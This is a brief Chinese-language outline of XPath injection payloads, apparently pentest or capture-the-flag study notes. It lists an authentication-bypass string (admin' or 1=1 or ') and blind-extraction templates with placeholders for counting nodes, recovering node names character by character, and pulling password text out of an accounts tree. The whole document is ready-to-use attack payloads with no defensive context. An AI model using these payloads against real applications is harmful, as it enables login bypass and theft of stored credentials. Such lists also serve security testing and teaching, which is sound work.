- # 注入示例
	- ```xpath
	  admin' or 1=1 or '
	  ```
	- 爆节点数
		- ```xpath
		  admin' or count(/*)>{} or '
		  ```
	- 爆节点名
		- ```xpath
		  admin' or substring(name(/*),{},1)='{}' or '
		  admin' or substring(name(/root/accounts/*[position()=1]),{},1)='{}' or '
		  ```
	- 爆内容
		- ```xpath
		  admin' or substring(/root/accounts/*[position()=2]/password/text(),{},1)='{}' or '
		  ```